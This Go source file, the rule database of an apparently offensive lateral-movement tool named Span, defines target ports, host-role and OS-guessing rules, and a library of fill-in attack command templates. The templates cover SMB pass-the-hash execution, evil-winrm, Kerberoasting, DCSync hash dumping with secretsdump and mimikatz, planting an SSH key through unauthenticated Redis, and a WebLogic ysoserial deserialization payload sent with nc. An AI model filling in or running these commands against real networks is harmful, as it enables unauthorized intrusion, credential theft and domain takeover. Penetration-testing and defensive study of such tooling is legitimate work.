// Package rules provides the rule database for Span's analysis engine.
// All rules are compiled into the binary (zero external dependencies).
package rules

import "github.com/span-dev/span/pkg/models"

// CommandTemplate defines a parameterized command template for attack execution.
type CommandTemplate struct {
	Key       string   // Unique key for lookup (e.g., "smb_psexec")
	Tool      string   // Tool name for display
	Templates []string // Command templates with placeholders: {target}, {user}, {pass}, {hash}, {port}
	Desc      string   // Brief description of what this command does
	Example   string   // Example with filled placeholders (for documentation)
}

// PortRule defines a single port's metadata for lateral movement scanning.
type PortRule struct {
	Port     int
	Service  string
	Protocol string
	Risk     models.RiskLevel
	Desc     string
	Category string // "auth", "file", "remote", "db", "web", "other"
}

// RoleRule defines port-combination-based role inference rules.
type RoleRule struct {
	Name       string
	Required   []int // Must-have ports
	Optional   []int // Bonus ports (increase confidence)
	Weight     int   // Base weight for sorting
	Desc       string
	OSHint     string  // Expected OS if this role matches
	Confidence float64 // Base confidence (0-1)
}

// OSHintRule defines TTL + banner + port combination rules for OS guessing.
type OSHintRule struct {
	TTLMin     int
	TTLMax     int
	BannerKw   []string // Banner keywords to match (any match = hit)
	Ports      []int    // Port combination hint
	Guess      string   // OS version guess
	Confidence string   // "high" | "medium" | "low"
}

// DefaultPortRules returns the built-in lateral movement port list (18 ports).
func DefaultPortRules() []PortRule {
	return []PortRule{
		{22, "ssh", "tcp", models.RiskHigh, "SSH 远程登录", "remote"},
		{53, "dns", "udp/tcp", models.RiskHigh, "DNS 域名解析 (域控标志)", "auth"},
		{88, "kerberos", "tcp", models.RiskCritical, "Kerberos 认证 (域控标志)", "auth"},
		{135, "rpc", "tcp", models.RiskHigh, "RPC 远程过程调用 / WMI 入口", "remote"},
		{139, "netbios-ssn", "tcp", models.RiskMedium, "NetBIOS 会话服务", "file"},
		{389, "ldap", "tcp", models.RiskCritical, "LDAP 目录服务 (域控标志)", "auth"},
		{445, "smb", "tcp", models.RiskCritical, "SMB 文件共享 / 域渗透核心入口", "file"},
		{636, "ldaps", "tcp", models.RiskCritical, "LDAPS 安全 LDAP (域控标志)", "auth"},
		{1433, "mssql", "tcp", models.RiskCritical, "Microsoft SQL Server 数据库", "db"},
		{3306, "mysql", "tcp", models.RiskMedium, "MySQL 数据库", "db"},
		{3389, "rdp", "tcp", models.RiskHigh, "RDP 远程桌面", "remote"},
		{5985, "winrm", "tcp", models.RiskHigh, "WinRM HTTP 远程管理 (PowerShell Remoting)", "remote"},
		{5986, "winrm-ssl", "tcp", models.RiskHigh, "WinRM HTTPS 远程管理", "remote"},
		{6379, "redis", "tcp", models.RiskCritical, "Redis 键值数据库 (未授权访问风险)", "db"},
		{7001, "weblogic", "tcp", models.RiskCritical, "WebLogic 应用服务器 (反序列化漏洞)", "web"},
		{8008, "tomcat-alt", "tcp", models.RiskHigh, "Tomcat 备用端口 / 代理服务", "web"},
		{8099, "custom-web", "tcp", models.RiskMedium, "自定义 Web 服务 (需人工确认)", "web"},
		{8898, "custom-service", "tcp", models.RiskMedium, "自定义服务 (需人工确认)", "other"},
	}
}

// DefaultRoleRules returns built-in role inference rules based on port combinations.
func DefaultRoleRules() []RoleRule {
	return []RoleRule{
		{
			Name:       "域控制器 (DC)",
			Required:   []int{53, 88, 389},
			Optional:   []int{445, 636, 3268, 3269},
			Weight:     10,
			Desc:       "Active Directory 域控制器，内网核心目标",
			OSHint:     "Windows Server",
			Confidence: 0.9,
		},
		{
			Name:       "Exchange 邮件服务器",
			Required:   []int{25, 80, 443, 587},
			Optional:   []int{143, 993, 389, 445},
			Weight:     8,
			Desc:       "Microsoft Exchange 邮件服务器 (常与 DC 共存)",
			OSHint:     "Windows Server",
			Confidence: 0.85,
		},
		{
			Name:       "MSSQL 数据库服务器",
			Required:   []int{1433},
			Optional:   []int{445, 3389, 135, 1434},
			Weight:     7,
			Desc:       "Microsoft SQL Server 数据库",
			OSHint:     "Windows Server",
			Confidence: 0.8,
		},
		{
			Name:       "MySQL 数据库服务器",
			Required:   []int{3306},
			Optional:   []int{22, 445, 3389},
			Weight:     6,
			Desc:       "MySQL/MariaDB 数据库服务器",
			OSHint:     "Linux/Windows 混合",
			Confidence: 0.75,
		},
		{
			Name:       "Redis 缓存服务器",
			Required:   []int{6379},
			Optional:   []int{22, 6380, 6378},
			Weight:     8,
			Desc:       "Redis 键值存储 (检查未授权访问)",
			OSHint:     "Linux",
			Confidence: 0.8,
		},
		{
			Name:       "WebLogic 应用服务器",
			Required:   []int{7001},
			Optional:   []int{80, 443, 8001, 8888},
			Weight:     7,
			Desc:       "Oracle WebLogic (关注反序列化漏洞 CVE-2020-14882 等)",
			OSHint:     "Linux/Windows",
			Confidence: 0.75,
		},
		{
			Name:       "Windows 跳板机/边界机",
			Required:   []int{3389, 445},
			Optional:   []int{135, 139, 5985, 5986},
			Weight:     5,
			Desc:       "Windows 双网卡机器或跳板机 (RDP + SMB 开放)",
			OSHint:     "Windows",
			Confidence: 0.65,
		},
		{
			Name:       "Linux SSH 服务器",
			Required:   []int{22},
			Optional:   []int{80, 443, 3306, 8080},
			Weight:     4,
			Desc:       "Linux 服务器 (SSH 开放)",
			OSHint:     "Linux",
			Confidence: 0.6,
		},
		{
			Name:       "DNS 服务器",
			Required:   []int{53},
			Optional:   []int{22, 389, 636},
			Weight:     5,
			Desc:       "DNS 域名解析服务器 (可能也是域控或网关)",
			OSHint:     "Linux/Windows",
			Confidence: 0.65,
		},
		{
			Name:       "域成员工作站/服务器",
			Required:   []int{135, 445, 139},
			Optional:   []int{3389, 5985, 49154, 49155, 49156, 49157},
			Weight:     4,
			Desc:       "Active Directory 域成员 (开放 RPC/SMB)",
			OSHint:     "Windows",
			Confidence: 0.55,
		},
		{
			Name:       "通用 Web 服务器",
			Required:   []int{80},
			Optional:   []int{443, 8080, 8008, 8099, 8888, 8898},
			Weight:     3,
			Desc:       "Web 服务器 (需进一步探测 Web 应用)",
			OSHint:     "未知",
			Confidence: 0.4,
		},
	}
}

// DefaultOSHints returns built-in OS heuristic rules.
func DefaultOSHints() []OSHintRule {
	return []OSHintRule{
		{
			TTLMin:     120,
			TTLMax:     132,
			Ports:      []int{445, 135, 139, 3389},
			Guess:      "Windows (Server 2008-2019)",
			Confidence: "medium",
		},
		{
			TTLMin:     60,
			TTLMax:     68,
			Ports:      []int{22},
			BannerKw:   []string{"OpenSSH", "SSH", "Ubuntu", "Debian", "CentOS"},
			Guess:      "Linux (发行版待定)",
			Confidence: "high",
		},
		{
			TTLMin:     240,
			TTLMax:     255,
			Ports:      nil,
			Guess:      "网络设备/Unix (Router/Switch/Solaris)",
			Confidence: "low",
		},
		{
			TTLMin:     118,
			TTLMax:     128,
			BannerKw:   []string{"Microsoft Windows", "SMB", "Microsoft-HTTPAPI"},
			Guess:      "Windows (Server 版本可能性高)",
			Confidence: "high",
		},
		{
			TTLMin:     32,
			TTLMax:     64,
			Ports:      []int{},
			Guess:      "Linux / Windows (TTL 不明确)",
			Confidence: "low",
		},
		{
			TTLMin:     120,
			TTLMax:     132,
			Ports:      []int{5985, 5986},
			Guess:      "Windows Server 2012+ (WinRM 支持)",
			Confidence: "medium",
		},
	}
}

// GetPortRule returns the PortRule for a given port number, or nil if not found.
func GetPortRule(port int) *PortRule {
	for _, r := range DefaultPortRules() {
		if r.Port == port {
			return &r
		}
	}
	return nil
}

// GetAllTargetPorts returns all target port numbers as a slice.
func GetAllTargetPorts() []int {
	rules := DefaultPortRules()
	ports := make([]int, len(rules))
	for i, r := range rules {
		ports[i] = r.Port
	}
	return ports
}

// DefaultCommandTemplates returns the built-in command template library.
func DefaultCommandTemplates() []CommandTemplate {
	return []CommandTemplate{
		// === SMB (445) ===
		{
			Key:  "smb_psexec",
			Tool: "Impacket (psexec.py)",
			Templates: []string{
				"psexec.py {domain}/{user}:{pass}@{target}",
				"psexec.py -hashes :{ntlm} {domain}/{user}@{target}",
			},
			Desc: "PSExec 远程执行（需要 SMB 凭证）",
		},
		{
			Key:  "smb_smbexec",
			Tool: "Impacket (smbexec.py)",
			Templates: []string{
				"smbexec.py {domain}/{user}:{pass}@{target}",
				"smbexec.py -hashes :{ntlm} {domain}/{user}@{target}",
			},
			Desc: "SMBExec 远程执行（比 PSExec 更隐蔽）",
		},
		{
			Key:  "smb_pth",
			Tool: "Impacket (psexec.py with hashes)",
			Templates: []string{
				"psexec.py -hashes :{ntlm} {domain}/{user}@{target}",
				"wmiexec.py -hashes :{ntlm} {domain}/{user}@{target}",
			},
			Desc: "Pass-the-Hash (哈希传递)",
		},

		// === RDP (3389) ===
		{
			Key:  "rdp_connect",
			Tool: "rdesktop / xfreerdp",
			Templates: []string{
				"rdesktop -u {user} -p {pass} {target}",
				"xfreerdp /u:{user} /p:{pass} /v:{target}",
			},
			Desc: "RDP 远程桌面连接",
		},

		// === WinRM (5985) ===
		{
			Key:  "winrm_evilwinrm",
			Tool: "evil-winrm",
			Templates: []string{
				"evil-winrm -i {target} -u {user} -p {pass}",
				"evil-winrm -i {target} -u {user} -H {ntlm}",
			},
			Desc: "WinRM 远程管理（PowerShell Remoting）",
		},

		// === LDAP (389) ===
		{
			Key:  "ldap_query",
			Tool: "ldapsearch",
			Templates: []string{
				"ldapsearch -x -H ldap://{target} -D '{user}' -W -b 'dc={domain},dc={tld}'",
				"ldapsearch -x -H ldap://{target} -b 'dc={domain},dc={tld}'",
			},
			Desc: "LDAP 域信息查询",
		},

		// === MSSQL (1433) ===
		{
			Key:  "mssql_client",
			Tool: "Impacket (mssqlclient.py)",
			Templates: []string{
				"mssqlclient.py {user}:{pass}@{target} -windows-auth",
				"mssqlclient.py -hashes :{ntlm} {user}@{target} -windows-auth",
			},
			Desc: "MSSQL 数据库客户端",
		},

		// === MySQL (3306) ===
		{
			Key:  "mysql_client",
			Tool: "mysql-client",
			Templates: []string{
				"mysql -h {target} -u {user} -p{pass}",
			},
			Desc: "MySQL 数据库客户端",
		},

		// === Redis (6379) ===
		{
			Key:  "redis_exploit",
			Tool: "redis-cli",
			Templates: []string{
				"redis-cli -h {target} -p 6379",
				"# 未授权访问时，可写入 SSH 公钥：",
				"redis-cli -h {target} config set dir /root/.ssh",
				"redis-cli -h {target} config set dbfilename authorized_keys",
				"redis-cli -h {target} set x \"\\n\\nssh-rsa AAAA...\\n\\n\"",
				"redis-cli -h {target} save",
			},
			Desc: "Redis 未授权访问利用",
		},

		// === SSH (22) ===
		{
			Key:  "ssh_connect",
			Tool: "ssh-client",
			Templates: []string{
				"ssh {user}@{target}",
				"ssh -i id_rsa {user}@{target}",
			},
			Desc: "SSH 远程登录",
		},

		// === Kerberos (88) ===
		{
			Key:  "kerberos_enum",
			Tool: "Impacket (GetNPUsers.py)",
			Templates: []string{
				"GetNPUsers.py {domain}/{user}:{pass} -dc-ip {target} -request",
				"GetUserSPNs.py {domain}/{user}:{pass} -dc-ip {target} -request",
			},
			Desc: "Kerberos 用户枚举 / SPN 枚举",
		},

		// === 域控 (DCSync) ===
		{
			Key:  "domain_dcsync",
			Tool: "Impacket (secretsdump.py)",
			Templates: []string{
				"secretsdump.py {domain}/{user}:{pass}@{target} -dc-ip {target}",
				"secretsdump.py -hashes :{ntlm} {domain}/{user}@{target} -dc-ip {target}",
				"# 或用 mimikatz (在目标机上执行):",
				"lsadump::dcsync /domain:{domain} /user:krbtgt",
			},
			Desc: "DCSync 获取域所有用户哈希",
		},

		// === WebLogic (7001) ===
		{
			Key:  "weblogic_exploit",
			Tool: "ysoserial / WebLogicScan",
			Templates: []string{
				"# 检测漏洞: WebLogicScan -u http://{target}:7001",
				"# 利用: java -jar ysoserial.jar CommonsCollections5 'cmd' | nc {target} 7001",
			},
			Desc: "WebLogic Java 反序列化漏洞利用",
		},
	}
}

// GetCommandTemplate returns the CommandTemplate for a given key, or nil if not found.
func GetCommandTemplate(cmdKey string) *CommandTemplate {
	for _, t := range DefaultCommandTemplates() {
		if t.Key == cmdKey {
			return &t
		}
	}
	return nil
}
